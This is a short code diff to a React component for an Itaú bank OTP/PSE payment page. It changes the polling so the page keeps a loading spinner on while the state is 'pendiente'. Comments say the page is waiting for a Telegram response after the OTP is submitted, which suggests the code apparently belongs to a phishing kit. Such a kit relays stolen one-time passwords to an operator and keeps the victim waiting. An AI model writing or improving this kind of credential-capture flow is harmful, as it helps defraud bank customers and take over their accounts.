@@ -198,7 +198,8 @@ const ItauOtpPse = () => {
         };
 
         stopPolling();
-        lastEstadoRef.current = null;
+        lastEstadoRef.current = 'pendiente';
+        allowPollNavigationRef.current = true;
         modalBloqueoEstadoRef.current = null;
         ignorarEstadoHastaCambioRef.current = null;
         setIsLoading(true);
@@ -267,8 +268,11 @@ const ItauOtpPse = () => {
                 return;
             }
 
-            // Si estamos esperando respuesta de Telegram tras enviar OTP y el estado sigue siendo sol_otp o pendiente, continuar esperando
-            if (allowPollNavigationRef.current && (estado === 'sol_otp' || estado === 'pendiente')) {
+            // Si estamos esperando respuesta de Telegram tras enviar OTP y el estado sigue siendo pendiente, continuar esperando con el loader activo
+            if (estado === 'pendiente') {
+                if (allowPollNavigationRef.current) {
+                    setIsLoading(true);
+                }
                 return;
             }
 
